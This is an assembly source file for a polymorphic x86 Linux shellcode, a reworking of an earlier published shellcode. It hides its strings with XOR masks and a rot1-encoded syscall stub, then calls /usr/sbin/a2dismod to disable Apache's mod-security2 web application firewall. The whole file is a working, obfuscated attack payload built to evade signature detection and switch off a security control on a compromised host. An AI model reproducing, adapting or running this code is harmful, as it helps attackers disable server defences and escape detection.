
/*

Polymorphic version of shellcode by /* sekfault@shellcode.com.ar - Goodfellas Security Research Team - 2010
/usr/sbin/a2dismod mod-security2 - disable modsecurity 64 bytes"

adp, 2018

- some masked strings (limit of 150%)
- rot1 encoded int 80
- 117 bytes 

*/

.global main
.text

.macro XOR_MASK VAL 
    movl $\VAL, %esi
    xorl %edi, %esi
    pushl %esi
.endm

main: 
        jmp call_trick          

prepare_deco: 
	xorl %ebx, %ebx 	/* ebx, eax, edx = 0 */
	mul %ebx
	popl %edx
remove_rot: 
	rorb $1, (%edx)
        leal 1(%edx),%edx         
        movb (%edx),%bl
        cmpb $0xff,%bl /* encoded shellcode ends with 0xff */            
        je cont
        jmp remove_rot                

cont:
	movl $0x2363ab35, %edi
	xor %eax,%eax
	push %eax 
        cdq 

	XOR_MASK 0x470CC646
	XOR_MASK 0x4A079954

 	push $0x2f6e6962 
 	push $0x732f7273 
 	push $0x752f2f2f 

        mov %esp,%ebx 
       	push $0x32 

	XOR_MASK 0x5A17C247

	movl $0x8BCC64A8, %esi
	xorl $0xddccaaee, %esi
	xorl %edi, %esi

	XOR_MASK 0xE07C458

        mov %esp,%ecx 
        xor %edx,%edx 
        mov $0xb,%al 
        push %edx 
       	push %ecx 
        push %ebx 
        mov %esp,%ecx 
        mov %esp,%edx 

	jmp shellcode

call_trick: 
        call prepare_deco
        shellcode: .byte 0x9b,0x01,0xff

